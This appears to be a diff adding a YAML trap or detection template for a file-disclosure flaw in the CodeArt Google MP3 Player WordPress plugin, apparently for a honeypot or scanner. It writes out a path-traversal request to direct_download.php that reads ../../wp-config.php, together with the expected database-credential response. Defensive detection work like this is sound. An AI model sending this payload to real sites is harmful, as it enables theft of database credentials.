@@ -1,0 +1,27 @@
+id: wp-googlemp3-lfi
+info:
+  name: WordPress Plugin CodeArt Google MP3 Player - File Disclosure Download
+  author: theamanrawat
+  description: 'WordPress Plugin CodeArt Google MP3 Player allows an unauthenticated
+    attacker to download file from server.
+
+    '
+  severity: critical
+  reference:
+  - https://www.exploit-db.com/exploits/35460
+  - https://wordpress.org/plugins/google-mp3-audio-player/
+  metadata:
+    verified: 'true'
+    max-request: 1
+    publicwww-query: /wp-content/plugins/google-mp3-audio-player/
+  tags: wp-plugin,wp,wordpress,lfi,google-mp3-audio-player,unauth,disclosure
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: DB_USERDB_PASSWORDDB_HOST
